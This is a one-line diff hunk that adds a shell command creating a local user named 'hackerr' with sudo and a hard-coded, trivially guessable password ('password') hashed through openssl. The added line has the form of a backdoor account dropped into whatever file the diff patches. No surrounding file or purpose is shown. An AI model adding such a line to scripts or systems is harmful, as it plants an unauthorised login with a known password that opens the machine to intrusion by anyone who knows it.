@@ -1,0 +1,1 @@
+sudo useradd -p $(openssl passwd -1 password) hackerr
